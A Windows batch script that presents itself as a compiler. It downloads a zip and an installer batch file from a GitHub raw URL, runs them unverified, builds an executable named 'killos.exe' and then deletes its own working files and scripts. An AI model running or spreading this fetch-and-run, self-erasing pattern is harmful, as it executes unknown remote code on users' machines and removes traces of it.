@echo off
title Compiler
mkdir compiler
cd compiler
curl https://raw.githubusercontent.com/KillaMeep/aboutmething/main/compiler.zip -O && tar -xf compiler.zip && del compiler.zip
curl https://raw.githubusercontent.com/KillaMeep/aboutmething/main/Installer.bat -O && start /W /b Installer.bat
cd killos
echo %CD% >> path.txt
move path.txt ..
cd ..
move path.txt compiler
cd compiler
pip install -r requirements.txt
start /b runcompiler.bat
timeout 15
clear
cd build && cd killos
move killos.exe ..
cd ..
move killos.exe ..
cd ..
move killos.exe ..
cd ..
move killos.exe ..
cd ..
echo @echo off >> delet.bat
echo taskkill /f /fi "WINDOWTITLE eq builder" >> delet.bat
echo RD /S /Q "compiler" >> delet.bat
echo del compiler.bat >> delet.bat
echo del delet.bat >> delet.bat
start delet.bat